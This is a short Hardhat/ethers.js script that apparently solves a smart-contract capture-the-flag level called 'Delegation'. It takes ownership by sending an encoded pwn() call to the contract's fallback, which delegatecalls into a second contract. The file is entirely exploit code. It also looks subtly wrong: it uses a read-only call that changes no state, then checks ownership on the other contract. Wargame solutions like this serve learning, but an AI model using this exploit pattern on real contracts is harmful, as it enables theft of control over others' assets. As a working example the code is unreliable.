import { ethers } from "hardhat";

async function main(){
    // random player address
    let player = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
    // delegation contract address
    let address_a = "0x68b1d87f95878fe05b998f19b66f4baba5de1aed";
    // delegate contract address
    let address_b = "0x9a9f2ccfde556a7e9ff0848998aa4a0cfd8863ae";

    let signer = await ethers.getSigner(player);
    // not needed on this stage
    let contract_a = await ethers.getContractAt("Delegation", address_a, signer);
    let contract_b = await ethers.getContractAt("Delegate", address_b, signer);

    // encoding function in ether.js, similar to selector function in solidity
    let ABI = [ "function pwn()" ];
    let iface = new ethers.utils.Interface(ABI);
    let data = iface.encodeFunctionData("pwn");

    let options = {
        to: address_a,
        data: data
    };

    // do raw call with data of encoded pwn() function to delegation smart contract and trigger fallback function
    await signer.call(options);

    // check that we are the owner now
    let owner = await contract_b.owner();
    console.log(owner);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
